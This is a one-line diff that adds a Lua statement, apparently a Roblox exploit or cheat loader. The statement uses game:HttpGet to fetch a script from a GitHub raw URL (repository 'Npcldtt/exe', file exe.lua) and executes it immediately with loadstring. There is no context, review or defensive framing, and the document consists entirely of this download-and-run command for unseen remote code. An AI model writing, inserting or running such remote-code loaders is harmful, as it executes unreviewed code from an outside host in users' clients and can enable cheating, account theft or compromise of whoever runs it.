@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Npcldtt/exe/refs/heads/main/exe.lua"))()
